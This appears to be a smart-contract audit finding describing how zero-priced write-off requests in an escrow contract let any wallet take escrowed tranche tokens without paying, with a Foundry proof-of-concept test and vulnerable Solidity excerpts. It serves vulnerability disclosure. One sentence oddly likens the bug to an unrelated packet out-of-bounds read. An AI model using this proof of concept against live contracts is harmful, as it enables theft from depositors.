### Title
Zero-priced write-off requests let any fulfiller steal escrowed tranche tokens - (contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary

`createWriteOffRequest` validates only that the deposited tranche amount is nonzero, but accepts `underlyingsRequested == 0`. `fullfillWriteOffRequest` then permits a zero-underlying fulfillment because it rejects only payments lower than the stored request. This creates an incomplete-order analog to the reported short-packet out-of-bounds read: the request is processed without validating that its payout field is economically complete.

### Finding Description

During a running epoch, a tranche holder creates a write-off request and escrows tranche tokens. The contract rejects `amount == 0`, but has no equivalent validation for `underlyingsRequested`. [1](#0-0) 

Any wallet may fulfill the request. Fulfillment requires an exact tranche count and a payment greater than or equal to the stored underlying amount, so a stored amount of zero accepts `_underlyings == 0`. [2](#0-1) 

The function then pulls zero underlying, sends zero proceeds to the seller, and transfers all escrowed tranche tokens to the fulfiller. [3](#0-2) 

### Impact Explanation

A fulfiller can acquire the seller’s full escrowed tranche position without paying any underlying. The broken invariant is that escrowed tranches must be exchanged for the requested underlying consideration.

The quantified loss is the full `amount` deposited through the malformed request. For example, a request for `10,000e18` tranche tokens and zero underlying transfers all `10,000e18` tokens to an attacker for `0` underlying. Depending on KYC status and the tranche’s current price, the attacker can retain, transfer, or redeem those tokens through the normal withdrawal path.

### Likelihood Explanation

Exploitation requires a lender to submit a request with `underlyingsRequested == 0`. Because request creation occurs while the epoch is running and fulfillment is permissionless, another user or bot can execute the zero-price order immediately in the same block or before the lender deletes it. [4](#0-3) [5](#0-4) 

The attacker does not need a privileged role, KYC approval, borrower status, an allowance from the seller, or underlying inventory.

### Recommendation

Reject incomplete write-off requests by requiring `underlyingsRequested != 0` in `createWriteOffRequest`. For additional protection, enforce a configured minimum underlying amount or require the fulfillment payment to be strictly nonzero when escrowed tranches are present.

### Proof of Concept

Add this test to `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`, which already forks mainnet at block `23032567` and initializes `escrow`, `LP`, `underlying`, and `tranche`: [6](#0-5) 

```solidity
function testZeroPriceWriteOffRequestCanBeFilledForFree() external {
    uint256 escrowedTranches = 10_000e18;
    address attacker = makeAddr("zeroPriceFulfiller");

    // Victim creates a malformed request: nonzero collateral, zero consideration.
    vm.prank(LP);
    escrow.createWriteOffRequest(escrowedTranches, 0);

    (uint256 storedTranches, uint256 storedUnderlyings) = escrow.userRequests(LP);
    assertEq(storedTranches, escrowedTranches);
    assertEq(storedUnderlyings, 0);
    assertEq(escrow.pendingUnderlyings(), 0);

    uint256 sellerTranchePre = tranche.balanceOf(LP);
    uint256 attackerTranchePre = tranche.balanceOf(attacker);
    uint256 attackerUnderlyingPre = underlying.balanceOf(attacker);
    uint256 sellerUnderlyingPre = underlying.balanceOf(LP);

    // Any unprivileged fulfiller can take the escrowed tranches for zero payment.
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, escrowedTranches, 0);

    (storedTranches, storedUnderlyings) = escrow.userRequests(LP);
    assertEq(storedTranches, 0);
    assertEq(storedUnderlyings, 0);

    assertEq(tranche.balanceOf(attacker) - attackerTranchePre, escrowedTranches);
    assertEq(tranche.balanceOf(LP), sellerTranchePre);
    assertEq(underlying.balanceOf(attacker), attackerUnderlyingPre);
    assertEq(underlying.balanceOf(LP), sellerUnderlyingPre);
}
```

  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;

  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }
